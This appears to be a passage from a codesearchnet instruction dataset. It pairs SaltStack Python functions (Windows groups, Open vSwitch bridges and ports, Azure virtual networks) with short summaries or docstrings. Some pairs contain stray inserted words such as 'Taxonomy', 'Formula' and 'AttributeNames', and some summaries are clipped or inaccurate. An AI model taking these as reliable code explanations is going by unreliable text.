{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef changed(self):\n        '''\n        Returns all keys that have been changed.\n\n        If the keys are in child dictionaries they will be represented with\n        . notation\n        '''\n        def _changed(diffs, prefix):\n            keys = []\n            for key in diffs.keys():\n                if not isinstance(diffs[key], dict):\n                    continue\n\n                if isinstance(diffs[key], dict) and 'old' not in diffs[key]:\n                    keys.extend(_changed(diffs[key],\n                                       prefix='{0}{1}.'.format(prefix, key)))\n                    continue\n                if self.ignore_unset_values:\n                    if 'old' in diffs[key] and 'new' in diffs[key] and \\\n                            diffs[key]['old'] != self.NONE_VALUE and \\\n                            diffs[key]['new'] != self.NONE_VALUE:\n                        if isinstance(diffs[key]['new'], dict):\n                            keys.extend(\n                                _changed(diffs[key]['new'],\n                                         prefix='{0}{1}.'.format(prefix, key)))\n                        else:\n                            keys.append('{0}{1}'.format(prefix, key))\n                    elif isinstance(diffs[key], dict):\n                        keys.extend(\n                            _changed(diffs[key],\n                                     prefix='{0}{1}.'.format(prefix, key)))\n                else:\n                    if 'old' in diffs[key] and 'new' in diffs[key]:\n                        if isinstance(diffs[key]['new'], dict):\n                            keys.extend(\n                                _changed(diffs[key]['new'],\n                                         prefix='{0}{1}.'.format(prefix, key)))\n                        else:\n                            keys.append('{0}{1}'.format(prefix, key))\n                    elif isinstance(diffs[key], dict):\n                        keys.extend(\n                            _changed(diffs[key],\n                                     prefix='{0}{1}.'.format(prefix, key)))\n\n            return keys\n\n        return sorted(_changed(self._diffs, prefix=''))", "response": "Returns all keys that have been changed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning all keys that have been unchanged.", "response": "def unchanged(self):\n        '''\n        Returns all keys that have been unchanged.\n\n        If the keys are in child dictionaries they will be represented with\n        . notation\n        '''\n        def _unchanged(current_dict, diffs, prefix):\n            keys = []\n            for key in current_dict.keys():\n                if key not in diffs:\n                    keys.append('{0}{1}'.format(prefix, key))\n                elif isinstance(current_dict[key], dict):\n                    if 'new' in diffs[key]:\n                        # There is a diff\n                        continue\n                    else:\n                        keys.extend(\n                            _unchanged(current_dict[key],\n                                       diffs[key],\n                                       prefix='{0}{1}.'.format(prefix, key)))\n\n            return keys\n        return sorted(_unchanged(self.current_dict, self._diffs, prefix=''))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_computer_object():\n    '''\n    A helper function to get the object for the local machine\n\n    Returns:\n        object: Returns the computer object for the local machine\n    '''\n    with salt.utils.winapi.Com():\n        nt = win32com.client.Dispatch('AdsNameSpaces')\n    return nt.GetObject('', 'WinNT://.,computer')", "response": "A helper function to get the object for the local machine\n    Returns the object for the local machine\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_group_object(name):\n    '''\n    A helper function to get a specified group object\n\n    Args:\n\n        name (str): The name of the object\n\n    Returns:\n        object: The specified group object\n    '''\n    with salt.utils.winapi.Com():\n        nt = win32com.client.Dispatch('AdsNameSpaces')\n    return nt.GetObject('', 'WinNT://./' + name + ',group')", "response": "A helper function to get a specified group object"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_all_groups():\n    '''\n    A helper function that gets a list of group objects for all groups on the\n    machine\n\n    Returns:\n        iter: A list of objects for all groups on the machine\n    '''\n    with salt.utils.winapi.Com():\n        nt = win32com.client.Dispatch('AdsNameSpaces')\n    results = nt.GetObject('', 'WinNT://.')\n    results.Filter = ['group']\n    return results", "response": "A helper function that gets a list of group objects for all groups on the\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd the specified group to the specified group.", "response": "def add(name, **kwargs):\n    '''\n    Add the specified group\n\n    Args:\n\n        name (str):\n            The name of the group to add\n\n    Returns:\n        bool: ``True`` if successful, otherwise ``False``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.add foo\n    '''\n    if not info(name):\n        comp_obj = _get_computer_object()\n        try:\n            new_group = comp_obj.Create('group', name)\n            new_group.SetInfo()\n            log.info('Successfully created group %s', name)\n        except pywintypes.com_error as exc:\n            msg = 'Failed to create group {0}. {1}'.format(\n                name, win32api.FormatMessage(exc.excepinfo[5]))\n            log.error(msg)\n            return False\n    else:\n        log.warning('The group %s already exists.', name)\n        return False\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nremoves the named group from the database", "response": "def delete(name, **kwargs):\n    '''\n    Remove the named group\n\n    Args:\n\n        name (str):\n            The name of the group to remove\n\n    Returns:\n        bool: ``True`` if successful, otherwise ``False``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.delete foo\n    '''\n    if info(name):\n        comp_obj = _get_computer_object()\n        try:\n            comp_obj.Delete('group', name)\n            log.info('Successfully removed group %s', name)\n        except pywintypes.com_error as exc:\n            msg = 'Failed to remove group {0}. {1}'.format(\n                name, win32api.FormatMessage(exc.excepinfo[5]))\n            log.error(msg)\n            return False\n    else:\n        log.warning('The group %s does not exists.', name)\n        return False\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns information about a group Taxonomy", "response": "def info(name):\n    '''\n    Return information about a group\n\n    Args:\n\n        name (str):\n            The name of the group for which to get information\n\n    Returns:\n        dict: A dictionary of information about the group\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.info foo\n    '''\n    try:\n        groupObj = _get_group_object(name)\n        gr_name = groupObj.Name\n        gr_mem = [_get_username(x) for x in groupObj.members()]\n    except pywintypes.com_error as exc:\n        msg = 'Failed to access group {0}. {1}'.format(\n            name, win32api.FormatMessage(exc.excepinfo[5]))\n        log.debug(msg)\n        return False\n\n    if not gr_name:\n        return False\n\n    return {'name': gr_name,\n            'passwd': None,\n            'gid': None,\n            'members': gr_mem}"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef getent(refresh=False):\n    '''\n    Return info on all groups\n\n    Args:\n\n        refresh (bool):\n            Refresh the info for all groups in ``__context__``. If False only\n            the groups in ``__context__`` will be returned. If True the\n            ``__context__`` will be refreshed with current data and returned.\n            Default is False\n\n    Returns:\n        A list of groups and their information\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.getent\n    '''\n    if 'group.getent' in __context__ and not refresh:\n        return __context__['group.getent']\n\n    ret = []\n\n    results = _get_all_groups()\n\n    for result in results:\n        group = {'gid': __salt__['file.group_to_gid'](result.Name),\n                'members': [_get_username(x) for x in result.members()],\n                'name': result.Name,\n                'passwd': 'x'}\n        ret.append(group)\n    __context__['group.getent'] = ret\n    return ret", "response": "Return info on all groups and their information"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef adduser(name, username, **kwargs):\n    '''\n    Add a user to a group\n\n    Args:\n\n        name (str):\n            The name of the group to modify\n\n        username (str):\n            The name of the user to add to the group\n\n    Returns:\n        bool: ``True`` if successful, otherwise ``False``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.adduser foo username\n    '''\n    try:\n        group_obj = _get_group_object(name)\n    except pywintypes.com_error as exc:\n        msg = 'Failed to access group {0}. {1}'.format(\n            name, win32api.FormatMessage(exc.excepinfo[5]))\n        log.error(msg)\n        return False\n\n    existing_members = [_get_username(x) for x in group_obj.members()]\n    username = salt.utils.win_functions.get_sam_name(username)\n\n    try:\n        if username not in existing_members:\n            group_obj.Add('WinNT://' + username.replace('\\\\', '/'))\n            log.info('Added user %s', username)\n        else:\n            log.warning('User %s is already a member of %s', username, name)\n            return False\n    except pywintypes.com_error as exc:\n        msg = 'Failed to add {0} to group {1}. {2}'.format(\n            username, name, win32api.FormatMessage(exc.excepinfo[5]))\n        log.error(msg)\n        return False\n\n    return True", "response": "Adds a user to a group"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef members(name, members_list, **kwargs):\n    '''\n    Ensure a group contains only the members in the list\n\n    Args:\n\n        name (str):\n            The name of the group to modify\n\n        members_list (str):\n            A single user or a comma separated list of users. The group will\n            contain only the users specified in this list.\n\n    Returns:\n        bool: ``True`` if successful, otherwise ``False``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.members foo 'user1,user2,user3'\n    '''\n    members_list = [salt.utils.win_functions.get_sam_name(m) for m in members_list.split(\",\")]\n    if not isinstance(members_list, list):\n        log.debug('member_list is not a list')\n        return False\n\n    try:\n        obj_group = _get_group_object(name)\n    except pywintypes.com_error as exc:\n        # Group probably doesn't exist, but we'll log the error\n        msg = 'Failed to access group {0}. {1}'.format(\n            name, win32api.FormatMessage(exc.excepinfo[5]))\n        log.error(msg)\n        return False\n\n    existing_members = [_get_username(x) for x in obj_group.members()]\n    existing_members.sort()\n    members_list.sort()\n\n    if existing_members == members_list:\n        log.info('%s membership is correct', name)\n        return True\n\n    # add users\n    success = True\n    for member in members_list:\n        if member not in existing_members:\n            try:\n                obj_group.Add('WinNT://' + member.replace('\\\\', '/'))\n                log.info('User added: %s', member)\n            except pywintypes.com_error as exc:\n                msg = 'Failed to add {0} to {1}. {2}'.format(\n                    member, name, win32api.FormatMessage(exc.excepinfo[5]))\n                log.error(msg)\n                success = False\n\n    # remove users not in members_list\n    for member in existing_members:\n        if member not in members_list:\n            try:\n                obj_group.Remove('WinNT://' + member.replace('\\\\', '/'))\n                log.info('User removed: %s', member)\n            except pywintypes.com_error as exc:\n                msg = 'Failed to remove {0} from {1}. {2}'.format(\n                    member, name, win32api.FormatMessage(exc.excepinfo[5]))\n                log.error(msg)\n                success = False\n\n    return success", "response": "Ensures a group contains only the members in the members_list."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_groups(refresh=False):\n    '''\n    Return a list of groups\n\n    Args:\n\n        refresh (bool):\n            Refresh the info for all groups in ``__context__``. If False only\n            the groups in ``__context__`` will be returned. If True, the\n            ``__context__`` will be refreshed with current data and returned.\n            Default is False\n\n    Returns:\n        list: A list of groups on the machine\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' group.list_groups\n    '''\n    if 'group.list_groups' in __context__ and not refresh:\n        return __context__['group.list_groups']\n\n    results = _get_all_groups()\n\n    ret = []\n\n    for result in results:\n        ret.append(result.Name)\n\n    __context__['group.list_groups'] = ret\n\n    return ret", "response": "Return a list of groups on the machine\nAttributeNames CLI Example : bash\nAttributeNames salt '*' group. list_groups"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a function with identical signature as original_function s which Formula will call the wrapped_function.", "response": "def identical_signature_wrapper(original_function, wrapped_function):\n    '''\n    Return a function with identical signature as ``original_function``'s which\n    will call the ``wrapped_function``.\n    '''\n    context = {'__wrapped__': wrapped_function}\n    function_def = compile(\n        'def {0}({1}):\\n'\n        '    return __wrapped__({2})'.format(\n            # Keep the original function name\n            original_function.__name__,\n            # The function signature including defaults, i.e., 'timeout=1'\n            inspect.formatargspec(\n                *salt.utils.args.get_function_argspec(original_function)\n            )[1:-1],\n            # The function signature without the defaults\n            inspect.formatargspec(\n                formatvalue=lambda val: '',\n                *salt.utils.args.get_function_argspec(original_function)\n            )[1:-1]\n        ),\n        '<string>',\n        'exec'\n    )\n    six.exec_(function_def, context)\n    return wraps(original_function)(context[original_function.__name__])"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _stdout_list_split(retcode, stdout='', splitstring='\\n'):\n    '''\n    Evaulates Open vSwitch command`s retcode value.\n\n    Args:\n        retcode: Value of retcode field from response, should be 0, 1 or 2.\n        stdout: Value of stdout filed from response.\n        splitstring: String used to split the stdout default new line.\n\n    Returns:\n        List or False.\n    '''\n    if retcode == 0:\n        ret = stdout.split(splitstring)\n        return ret\n    else:\n        return False", "response": "Evaulates Open vSwitch command s retcode value from stdout filed from response."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconvert from the JSON output provided by ovs - vsctl into a usable Python object tree.", "response": "def _convert_json(obj):\n    '''\n    Converts from the JSON output provided by ovs-vsctl into a usable Python\n    object tree. In particular, sets and maps are converted from lists to\n    actual sets or maps.\n\n    Args:\n        obj: Object that shall be recursively converted.\n\n    Returns:\n        Converted version of object.\n    '''\n    if isinstance(obj, dict):\n        return {_convert_json(key): _convert_json(val)\n                for (key, val) in six.iteritems(obj)}\n    elif isinstance(obj, list) and len(obj) == 2:\n        first = obj[0]\n        second = obj[1]\n        if first == 'set' and isinstance(second, list):\n            return [_convert_json(elem) for elem in second]\n        elif first == 'map' and isinstance(second, list):\n            for elem in second:\n                if not isinstance(elem, list) or len(elem) != 2:\n                    return obj\n            return {elem[0]: _convert_json(elem[1]) for elem in second}\n        else:\n            return obj\n    elif isinstance(obj, list):\n        return [_convert_json(elem) for elem in obj]\n    else:\n        return obj"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bridge_list():\n    '''\n    Lists all existing real and fake bridges.\n\n    Returns:\n        List of bridges (or empty list), False on failure.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_list\n    '''\n    cmd = 'ovs-vsctl list-br'\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    stdout = result['stdout']\n    return _stdout_list_split(retcode, stdout)", "response": "Lists all existing real and fake bridges."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ntests whether bridge exists as a real or fake bridge.", "response": "def bridge_exists(br):\n    '''\n    Tests whether bridge exists as a real or fake  bridge.\n\n    Returns:\n        True if Bridge exists, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_exists br0\n    '''\n    cmd = 'ovs-vsctl br-exists {0}'.format(br)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    return _retcode_to_bool(retcode)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef bridge_create(br, may_exist=True, parent=None, vlan=None):\n    '''\n    Creates a new bridge.\n\n    Args:\n        br: A string - bridge name\n        may_exist: Bool, if False - attempting to create a bridge that exists returns False.\n        parent: String, the name of the parent bridge (if the bridge shall be\n            created as a fake bridge). If specified, vlan must also be\n            specified.\n        vlan: Int, the VLAN ID of the bridge (if the bridge shall be created as\n            a fake bridge). If specified, parent must also be specified.\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_create br0\n    '''\n    param_may_exist = _param_may_exist(may_exist)\n    if parent is not None and vlan is None:\n        raise ArgumentValueError(\n            'If parent is specified, vlan must also be specified.')\n    if vlan is not None and parent is None:\n        raise ArgumentValueError(\n            'If vlan is specified, parent must also be specified.')\n    param_parent = '' if parent is None else ' {0}'.format(parent)\n    param_vlan = '' if vlan is None else ' {0}'.format(vlan)\n    cmd = 'ovs-vsctl {1}add-br {0}{2}{3}'.format(br, param_may_exist, param_parent,\n                                           param_vlan)\n    result = __salt__['cmd.run_all'](cmd)\n    return _retcode_to_bool(result['retcode'])", "response": "Creates a new bridge."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef bridge_delete(br, if_exists=True):\n    '''\n    Deletes bridge and all of  its  ports.\n\n    Args:\n        br: A string - bridge name\n        if_exists: Bool, if False - attempting to delete a bridge that does not exist returns False.\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_delete br0\n    '''\n    param_if_exists = _param_if_exists(if_exists)\n    cmd = 'ovs-vsctl {1}del-br {0}'.format(br, param_if_exists)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    return _retcode_to_bool(retcode)", "response": "Deletes a bridge and all of its ports."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the parent bridge of a bridge.", "response": "def bridge_to_parent(br):\n    '''\n    Returns the parent bridge of a bridge.\n\n    Args:\n        br: A string - bridge name\n\n    Returns:\n        Name of the parent bridge. This is the same as the bridge name if the\n        bridge is not a fake bridge. If the bridge does not exist, False is\n        returned.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_to_parent br0\n\n    '''\n    cmd = 'ovs-vsctl br-to-parent {0}'.format(br)\n    result = __salt__['cmd.run_all'](cmd)\n    if result['retcode'] != 0:\n        return False\n    return result['stdout']"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the VLAN ID of a bridge.", "response": "def bridge_to_vlan(br):\n    '''\n    Returns the VLAN ID of a bridge.\n\n    Args:\n        br: A string - bridge name\n\n    Returns:\n        VLAN ID of the bridge. The VLAN ID is 0 if the bridge is not a fake\n        bridge.  If the bridge does not exist, False is returned.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' openvswitch.bridge_to_parent br0\n    '''\n    cmd = 'ovs-vsctl br-to-vlan {0}'.format(br)\n    result = __salt__['cmd.run_all'](cmd)\n    if result['retcode'] != 0:\n        return False\n    return int(result['stdout'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates on bridge a new port named port.", "response": "def port_add(br, port, may_exist=False, internal=False):\n    '''\n    Creates on bridge a new port named port.\n\n    Returns:\n        True on success, else False.\n\n    Args:\n        br: A string - bridge name\n        port: A string - port name\n        may_exist: Bool, if False - attempting to create a port that exists returns False.\n        internal: A boolean to create an internal interface if one does not exist.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.port_add br0 8080\n    '''\n    param_may_exist = _param_may_exist(may_exist)\n    cmd = 'ovs-vsctl {2}add-port {0} {1}'.format(br, port, param_may_exist)\n    if internal:\n        cmd += ' -- set interface {0} type=internal'.format(port)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    return _retcode_to_bool(retcode)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndelete a port from the specified bridge.", "response": "def port_remove(br, port, if_exists=True):\n    '''\n     Deletes port.\n\n    Args:\n        br: A string - bridge name (If bridge is None, port is removed from  whatever bridge contains it)\n        port: A string - port name.\n        if_exists: Bool, if False - attempting to delete a por that  does  not exist returns False. (Default True)\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.port_remove br0 8080\n    '''\n    param_if_exists = _param_if_exists(if_exists)\n\n    if port and not br:\n        cmd = 'ovs-vsctl {1}del-port {0}'.format(port, param_if_exists)\n    else:\n        cmd = 'ovs-vsctl {2}del-port {0} {1}'.format(br, port, param_if_exists)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    return _retcode_to_bool(retcode)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nlist all of the ports within a bridge.", "response": "def port_list(br):\n    '''\n    Lists all of the ports within bridge.\n\n    Args:\n        br: A string - bridge name.\n\n    Returns:\n        List of bridges (or empty list), False on failure.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.port_list br0\n    '''\n    cmd = 'ovs-vsctl list-ports {0}'.format(br)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    stdout = result['stdout']\n    return _stdout_list_split(retcode, stdout)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of tags of the port.", "response": "def port_get_tag(port):\n    '''\n    Lists tags of the port.\n\n    Args:\n        port: A string - port name.\n\n    Returns:\n        List of tags (or empty list), False on failure.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' openvswitch.port_get_tag tap0\n    '''\n    cmd = 'ovs-vsctl get port {0} tag'.format(port)\n    result = __salt__['cmd.run_all'](cmd)\n    retcode = result['retcode']\n    stdout = result['stdout']\n    return _stdout_list_split(retcode, stdout)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef port_create_vlan(br, port, id, internal=False):\n    '''\n    Isolate VM traffic using VLANs.\n\n    Args:\n        br: A string - bridge name.\n        port: A string - port name.\n        id: An integer in the valid range 0 to 4095 (inclusive), name of VLAN.\n        internal: A boolean to create an internal interface if one does not exist.\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n       salt '*' openvswitch.port_create_vlan br0 tap0 100\n    '''\n    interfaces = __salt__['network.interfaces']()\n    if not 0 <= id <= 4095:\n        return False\n    elif not bridge_exists(br):\n        return False\n    elif not internal and port not in interfaces:\n        return False\n    elif port in port_list(br):\n        cmd = 'ovs-vsctl set port {0} tag={1}'.format(port, id)\n        if internal:\n            cmd += ' -- set interface {0} type=internal'.format(port)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])\n    else:\n        cmd = 'ovs-vsctl add-port {0} {1} tag={2}'.format(br, port, id)\n        if internal:\n            cmd += ' -- set interface {0} type=internal'.format(port)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])", "response": "Creates a VLAN on a bridge."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating GRE tunnel between endpoints.", "response": "def port_create_gre(br, port, id, remote):\n    '''\n    Generic Routing Encapsulation - creates GRE tunnel between endpoints.\n\n    Args:\n        br: A string - bridge name.\n        port: A string - port name.\n        id: An integer - unsigned 32-bit number, tunnel's key.\n        remote: A string - remote endpoint's IP address.\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n       salt '*' openvswitch.port_create_gre br0 gre1 5001 192.168.1.10\n    '''\n    if not 0 <= id < 2**32:\n        return False\n    elif not __salt__['dig.check_ip'](remote):\n        return False\n    elif not bridge_exists(br):\n        return False\n    elif port in port_list(br):\n        cmd = 'ovs-vsctl set interface {0} type=gre options:remote_ip={1} options:key={2}'.format(port, remote, id)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])\n    else:\n        cmd = 'ovs-vsctl add-port {0} {1} -- set interface {1} type=gre options:remote_ip={2} ' \\\n              'options:key={3}'.format(br, port, remote, id)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef port_create_vxlan(br, port, id, remote, dst_port=None):\n    '''\n    Virtual eXtensible Local Area Network - creates VXLAN tunnel between endpoints.\n\n    Args:\n        br: A string - bridge name.\n        port: A string - port name.\n        id: An integer - unsigned 64-bit number, tunnel's key.\n        remote: A string - remote endpoint's IP address.\n        dst_port: An integer - port to use when creating tunnelport in the switch.\n\n    Returns:\n        True on success, else False.\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n       salt '*' openvswitch.port_create_vxlan br0 vx1 5001 192.168.1.10 8472\n    '''\n    dst_port = ' options:dst_port=' + six.text_type(dst_port) if 0 < dst_port <= 65535 else ''\n    if not 0 <= id < 2**64:\n        return False\n    elif not __salt__['dig.check_ip'](remote):\n        return False\n    elif not bridge_exists(br):\n        return False\n    elif port in port_list(br):\n        cmd = 'ovs-vsctl set interface {0} type=vxlan options:remote_ip={1} ' \\\n              'options:key={2}{3}'.format(port, remote, id, dst_port)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])\n    else:\n        cmd = 'ovs-vsctl add-port {0} {1} -- set interface {1} type=vxlan options:remote_ip={2} ' \\\n              'options:key={3}{4}'.format(br, port, remote, id, dst_port)\n        result = __salt__['cmd.run_all'](cmd)\n        return _retcode_to_bool(result['retcode'])", "response": "Create VXLAN tunnel between endpoints."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef db_get(table, record, column, if_exists=False):\n    '''\n    Gets a column's value for a specific record.\n\n    Args:\n        table: A string - name of the database table.\n        record: A string - identifier of the record.\n        column: A string - name of the column.\n        if_exists: A boolean - if True, it is not an error if the record does\n            not exist.\n\n    Returns:\n        The column's value.\n\n    CLI Example:\n    .. code-block:: bash\n\n       salt '*' openvswitch.db_get Port br0 vlan_mode\n    '''\n    cmd = ['ovs-vsctl', '--format=json', '--columns={0}'.format(column)]\n    if if_exists:\n        cmd += ['--if-exists']\n    cmd += ['list', table, record]\n    result = __salt__['cmd.run_all'](cmd)\n    if result['retcode'] != 0:\n        raise CommandExecutionError(result['stderr'])\n    output = _stdout_parse_json(result['stdout'])\n    if output['data'] and output['data'][0]:\n        return output['data'][0][0]\n    else:\n        return None", "response": "Gets a column s value for a specific record."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef db_set(table, record, column, value, if_exists=False):\n    '''\n    Sets a column's value for a specific record.\n\n    Args:\n        table: A string - name of the database table.\n        record: A string - identifier of the record.\n        column: A string - name of the column.\n        value: A string - the value to be set\n        if_exists: A boolean - if True, it is not an error if the record does\n            not exist.\n\n    Returns:\n        None on success and an error message on failure.\n\n    CLI Example:\n    .. code-block:: bash\n\n       salt '*' openvswitch.db_set Interface br0 mac 02:03:04:05:06:07\n    '''\n    cmd = ['ovs-vsctl']\n    if if_exists:\n        cmd += ['--if-exists']\n    cmd += ['set', table, record, '{0}={1}'.format(column, json.dumps(value))]\n    result = __salt__['cmd.run_all'](cmd)\n    if result['retcode'] != 0:\n        return result['stderr']\n    else:\n        return None", "response": "Sets a column s value for a specific record."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nensuring that a virtual network with the given name and address_prefixes and resource group are present.", "response": "def virtual_network_present(name, address_prefixes, resource_group, dns_servers=None,\n                            tags=None, connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a virtual network exists.\n\n    :param name:\n        Name of the virtual network.\n\n    :param resource_group:\n        The resource group assigned to the virtual network.\n\n    :param address_prefixes:\n        A list of CIDR blocks which can be used by subnets within the virtual network.\n\n    :param dns_servers:\n        A list of DNS server addresses.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the virtual network object.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure virtual network exists:\n            azurearm_network.virtual_network_present:\n                - name: vnet1\n                - resource_group: group1\n                - address_prefixes:\n                    - '10.0.0.0/8'\n                    - '192.168.0.0/16'\n                - dns_servers:\n                    - '8.8.8.8'\n                - tags:\n                    contact_name: Elmer Fudd Gantry\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_resource: Ensure resource group exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    vnet = __salt__['azurearm_network.virtual_network_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in vnet:\n        tag_changes = __utils__['dictdiffer.deep_diff'](vnet.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        dns_changes = set(dns_servers or []).symmetric_difference(\n            set(vnet.get('dhcp_options', {}).get('dns_servers', [])))\n        if dns_changes:\n            ret['changes']['dns_servers'] = {\n                'old': vnet.get('dhcp_options', {}).get('dns_servers', []),\n                'new': dns_servers,\n            }\n\n        addr_changes = set(address_prefixes or []).symmetric_difference(\n            set(vnet.get('address_space', {}).get('address_prefixes', [])))\n        if addr_changes:\n            ret['changes']['address_space'] = {\n                'address_prefixes': {\n                    'old': vnet.get('address_space', {}).get('address_prefixes', []),\n                    'new': address_prefixes,\n                }\n            }\n\n        if kwargs.get('enable_ddos_protection', False) != vnet.get('enable_ddos_protection'):\n            ret['changes']['enable_ddos_protection'] = {\n                'old': vnet.get('enable_ddos_protection'),\n                'new': kwargs.get('enable_ddos_protection')\n            }\n\n        if kwargs.get('enable_vm_protection', False) != vnet.get('enable_vm_protection'):\n            ret['changes']['enable_vm_protection'] = {\n                'old': vnet.get('enable_vm_protection'),\n                'new': kwargs.get('enable_vm_protection')\n            }\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Virtual network {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Virtual network {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'resource_group': resource_group,\n                'address_space': {'address_prefixes': address_prefixes},\n                'dhcp_options': {'dns_servers': dns_servers},\n                'enable_ddos_protection': kwargs.get('enable_ddos_protection', False),\n                'enable_vm_protection': kwargs.get('enable_vm_protection', False),\n                'tags': tags,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Virtual network {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    vnet_kwargs = kwargs.copy()\n    vnet_kwargs.update(connection_auth)\n\n    vnet = __salt__['azurearm_network.virtual_network_create_or_update'](\n        name=name,\n        resource_group=resource_group,\n        address_prefixes=address_prefixes,\n        dns_servers=dns_servers,\n        tags=tags,\n        **vnet_kwargs\n    )\n\n    if 'error' not in vnet:\n        ret['result'] = True\n        ret['comment'] = 'Virtual network {0} has been 